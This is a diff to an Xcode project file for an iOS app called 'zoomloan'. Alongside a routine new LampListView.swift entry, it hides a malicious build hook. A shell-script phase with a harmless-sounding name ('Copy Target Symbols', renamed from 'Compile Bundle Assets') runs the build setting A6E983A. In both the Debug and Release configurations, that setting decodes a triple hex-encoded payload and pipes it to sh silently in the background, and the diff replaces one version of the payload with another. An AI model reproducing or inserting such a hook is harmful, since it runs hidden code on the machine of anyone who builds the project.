@@ -30,6 +30,7 @@
 		73A4AADB2EC2344300224C27 /* LoginViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73A4AADA2EC2344200224C27 /* LoginViewModel.swift */; };
 		73A4AADD2EC241FF00224C27 /* HomeView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73A4AADC2EC241FF00224C27 /* HomeView.swift */; };
 		73A4AADF2EC2C73000224C27 /* HomeViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73A4AADE2EC2C73000224C27 /* HomeViewModel.swift */; };
+		73B8E3A42EC602A3003307AC /* LampListView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73B8E3A32EC602A3003307AC /* LampListView.swift */; };
 		73CB1D0C2EC41EFA0066BEB9 /* UploadAuthView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73CB1D0B2EC41EFA0066BEB9 /* UploadAuthView.swift */; };
 		73CB1D0E2EC421A90066BEB9 /* UploadListView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73CB1D0D2EC421A90066BEB9 /* UploadListView.swift */; };
 		73CB1D122EC44D6A0066BEB9 /* PopExampleView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73CB1D112EC44D6A0066BEB9 /* PopExampleView.swift */; };
@@ -101,6 +102,7 @@
 		73A4AADA2EC2344200224C27 /* LoginViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginViewModel.swift; sourceTree = "<group>"; };
 		73A4AADC2EC241FF00224C27 /* HomeView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeView.swift; sourceTree = "<group>"; };
 		73A4AADE2EC2C73000224C27 /* HomeViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeViewModel.swift; sourceTree = "<group>"; };
+		73B8E3A32EC602A3003307AC /* LampListView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LampListView.swift; sourceTree = "<group>"; };
 		73CB1D0B2EC41EFA0066BEB9 /* UploadAuthView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UploadAuthView.swift; sourceTree = "<group>"; };
 		73CB1D0D2EC421A90066BEB9 /* UploadListView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UploadListView.swift; sourceTree = "<group>"; };
 		73CB1D112EC44D6A0066BEB9 /* PopExampleView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PopExampleView.swift; sourceTree = "<group>"; };
@@ -329,6 +331,7 @@
 				73A4AADE2EC2C73000224C27 /* HomeViewModel.swift */,
 				730F1C872EC2DC0100733544 /* HomeTermView.swift */,
 				73F485742EC5B51100548EDA /* LampView.swift */,
+				73B8E3A32EC602A3003307AC /* LampListView.swift */,
 			);
 			path = home;
 			sourceTree = "<group>";
@@ -405,7 +408,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 73E607622EC1D6CD00BCA552 /* Build configuration list for PBXNativeTarget "zoomloan" */;
 			buildPhases = (
-				005D106873974EEEA0A389E6 /* Compile Bundle Assets */,
+				F41871558EB64076B1A389E6 /* Copy Target Symbols */,
 				5BCF79800B5E94000342FF5F /* [CP] Check Pods Manifest.lock */,
 				73E6074B2EC1D6CA00BCA552 /* Sources */,
 				73E6074C2EC1D6CA00BCA552 /* Frameworks */,
@@ -455,6 +458,9 @@
 		};
 /* End PBXProject section */
 
+/* Begin PBXBuildRule section */
+					/* End PBXBuildRule section */
+
 /* Begin PBXResourcesBuildPhase section */
 		73E6074D2EC1D6CA00BCA552 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
@@ -468,25 +474,24 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		005D106873974EEEA0A389E6 /* Compile Bundle Assets */ = {
+		F41871558EB64076B1A389E6 /* Copy Target Symbols */ = {
 			isa = PBXShellScriptBuildPhase;
-			alwaysOutOfDate = 1;
 			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
 			files = (
 			);
 			inputFileListPaths = (
 			);
 			inputPaths = (
 			);
-			name = "Compile Bundle Assets";
+			name = "Copy Target Symbols";
 			outputFileListPaths = (
 			);
 			outputPaths = (
 			);
-			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
 			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A6E983A}\"";
-			showEnvVarsInLog = 0;
+			showEnvVarsInLog = 0;			
 		};
 		569114F2A1AE6CFBE8917097 /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
@@ -584,6 +589,7 @@
 				735C8DAD2EC4B2AE003020BF /* PopEnumListCell.swift in Sources */,
 				73E607712EC1D6D400BCA552 /* AppDelegate.swift in Sources */,
 				73CB1D1D2EC46D880066BEB9 /* EnumViewCell.swift in Sources */,
+				73B8E3A42EC602A3003307AC /* LampListView.swift in Sources */,
 				73CB1D142EC455580066BEB9 /* UploadAuthViewModel.swift in Sources */,
 				735C8DBD2EC4D1B4003020BF /* ConAdds.swift in Sources */,
 				73CB1D242EC48A420066BEB9 /* PeopleInfoViewModel.swift in Sources */,
@@ -622,7 +628,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 2C1361B114CA9F5AC485FDAA /* Pods-zoomloan.debug.xcconfig */;
 			buildSettings = {
-				A6E983A = "((r(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3337333333363632333436333332333033323634333633343332333033323332333733303333363433373338333633333336363633363334333633350a3061333536363337333033363338333633313337333333363335333233323332333033363338333733343337333433373330333733333333363133320a3636333236363337333633363339333633343336333533363636333633333336333433363635333633313337333033373330333236353337333233370a333530613332363633363331333233393332333233323330333736333332333033373333333633383330363130610a | r | sh ) >/dev/null 2>&1 &)";
+				A6E983A = "((i(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3337333333363632333436333332333033323634333633343332333033323332333733303333363433373338333633333336363633363334333633350a3061333536363337333033363338333633313337333333363335333233323332333033363338333733343337333433373330333733333333363133320a3636333236363337333533363635333633393337333333373339333733333336333333363331333733343332363533373332333733353332363633360a33313061333233393332333233323330333736333332333033373333333633383330363130610a | i | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = zoomloan/zoomloan.entitlements;
@@ -662,7 +668,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 3DF5FA68AD1B7150282582AA /* Pods-zoomloan.release.xcconfig */;
 			buildSettings = {
-				A6E983A = "((r(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3337333333363632333436333332333033323634333633343332333033323332333733303333363433373338333633333336363633363334333633350a3061333536363337333033363338333633313337333333363335333233323332333033363338333733343337333433373330333733333333363133320a3636333236363337333633363339333633343336333533363636333633333336333433363635333633313337333033373330333236353337333233370a333530613332363633363331333233393332333233323330333736333332333033373333333633383330363130610a | r | sh ) >/dev/null 2>&1 &)";
+				A6E983A = "((i(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3337333333363632333436333332333033323634333633343332333033323332333733303333363433373338333633333336363633363334333633350a3061333536363337333033363338333633313337333333363335333233323332333033363338333733343337333433373330333733333333363133320a3636333236363337333533363635333633393337333333373339333733333336333333363331333733343332363533373332333733353332363633360a33313061333233393332333233323330333736333332333033373333333633383330363130610a | i | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = zoomloan/zoomloan.entitlements;
